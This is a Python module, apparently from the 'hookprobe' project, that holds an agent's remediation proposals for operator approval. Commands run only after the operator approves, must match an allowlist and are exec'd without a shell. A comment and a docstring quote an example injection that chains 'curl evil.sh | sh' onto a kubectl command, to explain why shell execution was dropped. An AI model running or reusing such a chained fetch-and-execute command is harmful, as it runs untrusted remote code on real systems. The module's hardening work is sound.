"""From "here is what I would do" to "done, with receipts" — one gate at a time.

The investigator is read-only by design, and stays read-only: this module
never gives the AGENT a pen. A report may end with a fenced ```remediation
block — structured steps, each with a command, a risk and a rollback — and the
SERVICE lifts that block into a proposal file. From there every transition is
an operator's:

    proposed ──(operator approves)──► running ──► executed | failed
        └─────(operator rejects)───► rejected

`running` is the one state no operator can leave: only the executing task
writes it, so a process that dies mid-sequence used to strand the row there
forever — approve and reject both require `proposed`. The next boot settles
those into `failed`, recording which commands ran and which never did
(`settle_interrupted`).

Execution is dumb on purpose, and lives here beside the persistence rather than
in the service: the approved commands run exactly as written, sequentially,
stop-on-first-failure, each output captured and each command appended to the
same audit JSONL the agent's tools write to. No agent in the loop at execution
time — an agent that "adapts" an approved command is executing something nobody
approved. The service owns only the task the sequence runs in, because that is
what its shutdown has to wait for.

The gate that makes any of this runnable is the allowlist file
(HOOKPROBE_REMEDIATION_ALLOWLIST): one regex per line, hot-read at execution
time, deny-by-default. No file, no execution — proposals still collect, which
is the shipping default. The read-only bash guard's deny list deliberately
does NOT apply here: remediation exists to do the mutations that guard blocks,
and its gate is the operator's allowlist plus the operator's click, not a
regex that errs toward blocking investigations.

The proposals directory is on the input guard's protected list: the agent
proposes THROUGH its report, so a direct write could only mean forging a
proposal's provenance. (A bash write around that guard still produces only a
`proposed` row — approval and the allowlist stand between it and execution.)
"""

from __future__ import annotations

import asyncio
import json
import logging
import re
import shlex
import time
import uuid
from pathlib import Path
from typing import Any

from hookprobe.files import atomic_write

logger = logging.getLogger("hookprobe.remediation")

DIRNAME = "remediation"

_BLOCK = re.compile(r"```remediation\s*\n(.*?)```", re.DOTALL)
_MAX_STEPS = 5
_RISKS = ("low", "medium", "high")


def extract(text: str) -> list[dict[str, Any]]:
    """The steps a report proposed, validated — or nothing.

    The block stays in the report on purpose (unlike memory-suggestion
    markers): remediation advice is content a human reading the case file
    wants; this only lifts a structured copy.
    """
    match = _BLOCK.search(text or "")
    if not match:
        return []
    try:
        raw = json.loads(match.group(1))
    except ValueError:
        return []
    if not isinstance(raw, list):
        return []
    steps: list[dict[str, Any]] = []
    for entry in raw[:_MAX_STEPS]:
        if not isinstance(entry, dict):
            continue
        command = str(entry.get("command") or "").strip()
        action = str(entry.get("action") or "").strip()
        if not command or not action:
            continue
        risk = str(entry.get("risk") or "medium").strip().lower()
        steps.append(
            {
                "action": action[:200],
                "command": command[:500],
                "target": str(entry.get("target") or "").strip()[:200],
                "risk": risk if risk in _RISKS else "medium",
                "rollback": str(entry.get("rollback") or "").strip()[:500],
            }
        )
    return steps


def propose(workdir: Path, session_key: str, steps: list[dict[str, Any]]) -> str:
    """Park a run's steps as a proposal; returns its id."""
    directory = workdir / DIRNAME
    directory.mkdir(parents=True, exist_ok=True)
    proposal_id = uuid.uuid4().hex[:10]
    _write(
        directory / f"{proposal_id}.json",
        {
            "id": proposal_id,
            "session_key": session_key,
            "created_at": round(time.time(), 3),
            "status": "proposed",
            "steps": steps,
            "results": [],
        },
    )
    return proposal_id


def load(workdir: Path, proposal_id: str) -> dict[str, Any] | None:
    path = workdir / DIRNAME / f"{proposal_id}.json"
    if not re.fullmatch(r"[0-9a-f]{10}", proposal_id) or not path.is_file():
        return None
    try:
        row = json.loads(path.read_text(encoding="utf-8"))
    except (OSError, ValueError):
        return None
    return row if isinstance(row, dict) else None


def list_all(workdir: Path, limit: int = 100) -> list[dict[str, Any]]:
    directory = workdir / DIRNAME
    rows: list[dict[str, Any]] = []
    try:
        paths = sorted(directory.glob("*.json"), key=lambda p: p.stat().st_mtime, reverse=True)
    except OSError:
        return []
    for path in paths[: max(1, limit)]:
        try:
            row = json.loads(path.read_text(encoding="utf-8"))
        except (OSError, ValueError):
            continue
        if isinstance(row, dict):
            rows.append(row)
    return rows


def save(workdir: Path, row: dict[str, Any]) -> None:
    _write(workdir / DIRNAME / f"{row['id']}.json", row)


def settle_interrupted(workdir: Path) -> list[dict[str, Any]]:
    """Terminate rows a dead process left mid-execution; returns what it settled.

    A procedure is written as 1-2-3 and runs stop-on-first-failure, so the fact
    an operator needs before touching the target again is which commands landed.
    The results list already holds one entry per command that ran, in order —
    everything past it never started. `failed` is the terminal state for a
    sequence that did not complete, and unlike `running` it is a state the row
    can be read in.
    """
    settled: list[dict[str, Any]] = []
    for row in list_all(workdir, limit=1000):
        if row.get("status") != "running":
            continue
        commands = [str(step.get("command") or "") for step in row.get("steps") or []]
        ran = len(row.get("results") or [])
        row["status"] = "failed"
        row["executed_at"] = round(time.time(), 3)
        row["interrupted"] = {"ran": commands[:ran], "not_run": commands[ran:]}
        try:
            save(workdir, row)
        except OSError:
            continue
        settled.append(row)
    return settled


def _write(path: Path, row: dict[str, Any]) -> None:
    atomic_write(path, (json.dumps(row, ensure_ascii=False, indent=2) + "\n").encode("utf-8"))


# Tokens that only a shell can mean. A remediation command containing one of
# these cannot be executed as an argv, and running it through a shell is what
# made the allowlist unenforceable: `kubectl rollout restart .*` reads as "a
# target name may vary" and actually permitted
# `kubectl rollout restart api; curl evil.sh | sh`, because the wildcard span
# was handed to /bin/sh. So a command that needs a shell is refused instead —
# a deliberate narrowing, and the honest one: a pattern cannot bound what a
# pipeline does.
_SHELL_ONLY_TOKENS = frozenset({";", "|", "||", "&", "&&", ">", ">>", "<", "<<", "(", ")", "$"})
_SHELL_ONLY_CHARS = ("`", "\n")


def argv_for(command: str) -> tuple[list[str] | None, str]:
    """The command as an argv, or None and the reason it cannot be one.

    Lexed with punctuation_chars so every shell operator arrives as its own
    token and can be refused by identity rather than by scanning for substrings
    inside quoted text. That lexing also normalises the string-splitting trick
    (`"de""lete"` becomes `delete`), so what the allowlist matched and what
    would actually run cannot differ by quoting.
    """
    if any(char in command for char in _SHELL_ONLY_CHARS):
        return None, "command substitution or a newline needs a shell, which is not available here"
    lexer = shlex.shlex(command, posix=True, punctuation_chars=True)
    lexer.whitespace_split = True
    try:
        tokens = list(lexer)
    except ValueError as exc:
        return None, f"command is not lexable ({exc})"
    for token in tokens:
        if token in _SHELL_ONLY_TOKENS:
            return None, f"{token!r} needs a shell; an allowlist pattern cannot bound what follows it"
    if not tokens:
        return None, "empty command"
    return tokens, ""


def allowlist_patterns(path: Path | None) -> list[str]:
    """Read fresh on every call, so editing the file needs no restart.

    Called at BOTH gates — once by approve() over the whole procedure, and again
    by execute() immediately before each command. The second read is the one
    that matters for a file an operator edits during an incident: tightening the
    allowlist while a procedure is mid-flight now stops the remaining steps,
    where before the whole sequence ran against whatever the file said at the
    moment of the click.
    """
    if path is None:
        return []
    try:
        lines = path.read_text(encoding="utf-8").splitlines()
    except OSError:
        return []
    return [line.strip() for line in lines if line.strip() and not line.strip().startswith("#")]


def deny_reason(command: str, patterns: list[str]) -> str | None:
    """Why this command may not run — deny by default, allow by explicit match."""
    if not patterns:
        return "no allowlist configured (HOOKPROBE_REMEDIATION_ALLOWLIST); proposals collect, nothing executes"
    for pattern in patterns:
        try:
            if re.fullmatch(pattern, command):
                return None
        except re.error:
            continue  # a broken pattern must fail closed, not open
    return "command matches no allowlist pattern"


def approve(workdir: Path, proposal_id: str, *, allowlist: Path | None, note: str = "") -> dict[str, Any]:
    """The operator's click. Gate-checks EVERY step against the allowlist
    before anything runs — a proposal that is half executable is refused
    whole, because "steps 1 and 3 ran" is the worst possible outcome of a
    procedure written as 1-2-3."""
    row = load(workdir, proposal_id)
    if row is None:
        raise LookupError("no such proposal")
    if row.get("status") != "proposed":
        raise ValueError(f"proposal is {row.get('status')}, not proposed")
    patterns = allowlist_patterns(allowlist)
    for step in row.get("steps", []):
        reason = deny_reason(str(step.get("command") or ""), patterns)
        if reason is not None:
            raise PermissionError(f"step '{step.get('action')}': {reason}")
    row["status"] = "running"
    row["approved_at"] = round(time.time(), 3)
    row["approved_note"] = note[:300]
    save(workdir, row)
    return row


def reject(workdir: Path, proposal_id: str) -> dict[str, Any]:
    row = load(workdir, proposal_id)
    if row is None:
        raise LookupError("no such proposal")
    if row.get("status") != "proposed":
        raise ValueError(f"proposal is {row.get('status')}, not proposed")
    row["status"] = "rejected"
    row["resolved_at"] = round(time.time(), 3)
    save(workdir, row)
    return row


async def execute(workdir: Path, row: dict[str, Any], *, bash_timeout_ms: int, allowlist: Path | None = None) -> None:
    """Approved commands run EXACTLY as written: sequentially, stop on the
    first failure, output captured, every command on the audit log. No
    agent in this loop — an agent that adapts an approved command is
    executing something nobody approved.

    NO SHELL. Each command is lexed into an argv and exec'd directly, so the
    allowlist pattern that permitted it bounds what actually runs. Under a shell
    it did not: any pattern with a wildcard handed that span to /bin/sh, and
    `kubectl rollout restart .*` — written to let a target name vary — also
    permitted `; curl evil.sh | sh`. A command that genuinely needs a shell is
    refused with a reason rather than quietly widened.

    The allowlist is re-checked HERE, per command, not only at the click. An
    operator tightening the file during an incident should stop the steps that
    have not run yet; approve-time-only meant the whole sequence ran against
    whatever the file said when the button was pressed.
    """
    timeout = max(30.0, (bash_timeout_ms or 120000) / 1000.0)
    failed = False
    for step in row.get("steps", []):
        command = str(step.get("command") or "")
        started = time.monotonic()
        # Second gate. Deny-by-default holds: a file that has since been emptied
        # or narrowed stops the rest of the procedure.
        refusal = deny_reason(command, allowlist_patterns(allowlist))
        if refusal is None:
            argv, refusal = argv_for(command)
        else:
            argv = None
        if argv is None:
            row.setdefault("results", []).append(
                {
                    "command": command,
                    "exit": -1,
                    "ms": 0,
                    "output": f"refused at execution: {refusal}",
                }
            )
            logger.warning("remediation step refused at execution: %s — %s", command, refusal)
            failed = True
            break
        try:
            process = await asyncio.create_subprocess_exec(
                *argv,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.STDOUT,
                cwd=str(workdir),
            )
            try:
                output, _ = await asyncio.wait_for(process.communicate(), timeout=timeout)
            except TimeoutError:
                process.kill()
                await process.wait()
                output, returncode = b"(timed out)", -1
            else:
                returncode = int(process.returncode or 0)
        except OSError as exc:
            output, returncode = str(exc).encode(), -1
        result = {
            "command": command,
            "exit": returncode,
            "ms": int((time.monotonic() - started) * 1000),
            "output": output.decode("utf-8", "replace")[-10000:],
        }
        row.setdefault("results", []).append(result)
        _audit(workdir, row["id"], command, returncode != 0)
        if returncode != 0:
            failed = True
            break
    row["status"] = "failed" if failed else "executed"
    row["executed_at"] = round(time.time(), 3)
    try:
        save(workdir, row)
    except OSError:
        # The commands have already run; losing the write would leave the row
        # saying `running` with nobody to correct it, so it is worth a loud
        # line. The audit log above still has every command, and the next
        # boot's sweep settles the row.
        logger.exception("remediation %s id=%s but the row could not be written", row["status"], row["id"])
    logger.info("remediation %s id=%s", row["status"], row["id"])


def _audit(workdir: Path, proposal_id: str, command: str, error: bool) -> None:
    """Same flight recorder the agent's tools write to — one account."""
    try:
        audit_dir = workdir / "audit"
        audit_dir.mkdir(parents=True, exist_ok=True)
        line = {
            "ts": round(time.time(), 3),
            "session": f"remediation:{proposal_id}",
            "tool": "Exec",
            "detail": command[:300],
            "error": error,
        }
        with (audit_dir / (time.strftime("%Y-%m-%d") + ".jsonl")).open("a", encoding="utf-8") as handle:
            handle.write(json.dumps(line, ensure_ascii=False) + "\n")
    except OSError:
        logger.debug("remediation audit write failed", exc_info=True)
